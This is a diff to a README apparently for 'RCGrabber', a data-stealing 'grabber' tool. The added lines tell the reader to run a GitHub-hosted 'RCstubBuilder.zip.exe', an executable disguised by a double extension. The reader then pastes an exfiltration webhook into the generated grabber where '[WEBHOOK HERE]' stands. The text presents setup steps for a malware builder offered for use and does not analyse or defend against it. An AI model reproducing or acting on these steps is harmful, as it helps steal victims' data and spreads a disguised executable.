@@ -31,7 +31,10 @@
 
 ## installation
 
-- follow the stpes of the 
+- open https://github.com/RCmethodz/RCGrabber/blob/main/RCstubBuilder.zip.exe
+- let it load.
+- once it created a grabber open it in notepadd as example and paste your webooh in [WEBHOOK HERE]
+
 
 ![image](https://github.com/RCmethodz/RCGrabber/assets/155228545/277ec444-913c-4163-ae75-1733040aa323)
 
